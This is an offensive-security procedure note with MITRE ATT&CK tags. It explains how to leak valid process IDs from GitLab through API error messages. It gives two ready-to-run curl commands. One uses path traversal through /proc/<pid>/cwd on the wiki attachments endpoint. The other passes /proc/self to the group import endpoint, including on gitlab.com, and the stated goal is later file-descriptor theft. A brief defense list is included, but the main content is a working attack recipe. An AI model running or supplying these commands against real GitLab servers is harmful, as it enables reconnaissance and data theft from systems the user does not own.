---
tags:
  - pid-leak
  - info-disclosure
  - gitlab
type: procedure
tools:
  - '[[tools/sudo]]'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
commands: []
platforms:
  - Linux
  - GitLab
techniques:
  - '[[File and Directory Discovery]]'
  - '[[Data from Local System]]'
skill_level: advanced
impact_level: medium
detection_risk: low
sub_techniques: []
id: 8760b5c2-6b1f-4d96-9f88-8baa5dae7638
created_at: '2025-12-11T03:47:39.424Z'
updated_at: '2025-12-11T03:47:39.424Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0007]]'
  - '[[TA0009]]'
mitre_techniques:
  - '[[T1083]]'
  - '[[T1005]]'
---
# Discover Valid PIDs via Information Leak

## Summary

This procedure leaks process IDs and paths from GitLab API error messages to target for further exploitation.

## Description

Error responses from endpoints like group import reveal insecure paths including PIDs, aiding in /proc-based attacks. Performed via trial-and-error requests in GitLab setups.

## Requirements
1. API access token
2. Knowledge of potential PID ranges
3. curl for probing

## Defense

- Sanitize error messages
- Restrict path parameters
- Monitor for repeated failed requests

## Objectives
1. Identify readable /proc entries
2. Leak PID for process targeting
3. Prepare for file descriptor theft

## Instructions

### Step 1: Probe PIDs with HTTP Codes

**Context**: Test validity via response codes.

**Command** ([[commands/curl-check-pid-http-code]]):
```bash
curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
```

> Returns 201 for valid paths.

### Step 2: Leak PID via Group Import

**Context**: Use /proc/self to disclose current PID.

**Command** ([[commands/curl-leak-pid-group-import]]):
```bash
curl -H "Authorization: Bearer $TOKEN_R" -F 'lala=@/tmp/lala.txt' 'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/self'
```

> Error message leaks PID like '/proc/9348'.

## MITRE ATT&CK Mapping

### Tactics
- [[Discovery]]
- [[Collection]]

### Techniques
- [[File and Directory Discovery]]
- [[Data from Local System]]

### Sub-Techniques
- None

## Commands Used
- [[commands/curl-check-pid-http-code]]
- [[commands/curl-leak-pid-group-import]]

## Tools Used
- #curl

## Tags
- [[commands/curl-leak-pid-group-import]]
- #info-disclosure
- #gitlab
